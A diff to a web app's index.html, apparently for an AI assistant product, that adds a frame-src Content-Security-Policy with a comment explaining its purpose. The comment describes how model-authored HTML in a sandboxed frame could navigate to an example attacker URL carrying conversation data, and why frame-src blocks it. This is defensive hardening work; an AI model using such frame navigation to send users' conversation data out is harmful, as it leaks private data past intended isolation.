@@ -6,6 +6,40 @@
   <!-- viewport-fit=cover is required for iOS WKWebView to expose env(safe-area-inset-*);
        without it the Capacitor shell renders under the notch / home indicator. -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+
+  <!--
+    frame-src, and only frame-src. Surfaces that render model-authored HTML
+    (`visual`, dynamic pages, app viewer) do so in a srcdoc frame sandboxed
+    without `allow-same-origin`, and that frame is denied all network access by
+    its own CSP. What no CSP inside the frame can express is the frame
+    navigating its own browsing context: `default-src` governs subresources,
+    and `navigate-to` was never shipped. A document is therefore free to send
+    itself to `https://attacker.example/?d=<conversation data>`, which is
+    egress out of a document that is supposed to have none.
+
+    The embedding page is the only place that navigation can be refused, and
+    `frame-src` is enforced on every navigation of a nested browsing context,
+    not just its first load. srcdoc frames resolve as 'self', so the surfaces
+    keep working.
+
+    The Stripe entries are the frame-src set from Stripe's own CSP guidance
+    (https://docs.stripe.com/security/guide#content-security-policy), which
+    the billing modal needs to mount Elements: `*.js.stripe.com` because
+    Stripe.js starts frames on varying subdomains, `hooks.stripe.com` for
+    redirect-based methods such as 3D Secure, and the Link domains for the
+    Link option inside the payment element. Omitting any of them breaks the
+    payment flow on web with no build-time signal.
+
+    This is deliberately a single directive rather than a whole policy. A full
+    CSP for the SPA is worth having, but it is a much larger change with real
+    breakage surface (fonts, session replay, analytics) and belongs in its own
+    rollout behind report-only. Widening this list is the only reason to touch
+    it: any other directive added here starts blocking things this comment
+    makes no claim about.
+  -->
+  <meta http-equiv="Content-Security-Policy"
+        content="frame-src 'self' https://js.stripe.com https://*.js.stripe.com https://hooks.stripe.com https://link.com https://*.link.com" />
+
   <link rel="icon" href="/favicon.svg" />
   <link rel="apple-touch-icon" href="/favicon.svg" />
   <title>Vellum Assistant</title>
